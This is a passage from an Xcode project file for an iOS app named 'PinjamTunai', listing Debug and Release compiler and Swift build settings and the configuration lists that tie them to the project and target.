				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		737D1ECC2EE4545F003CC748 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_EMIT_LOC_STRINGS = YES;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		737D1EB02EE4545E003CC748 /* Build configuration list for PBXProject "PinjamTunai" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				737D1ECB2EE4545F003CC748 /* Debug */,
				737D1ECC2EE4545F003CC748 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		737D1EC82EE4545F003CC748 /* Build configuration list for PBXNativeTarget "PinjamTunai" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				737D1EC92EE4545F003CC748 /* Debug */,
				737D1ECA2EE4545F003CC748 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 737D1EAD2EE4545E003CC748 /* Project object */;
}
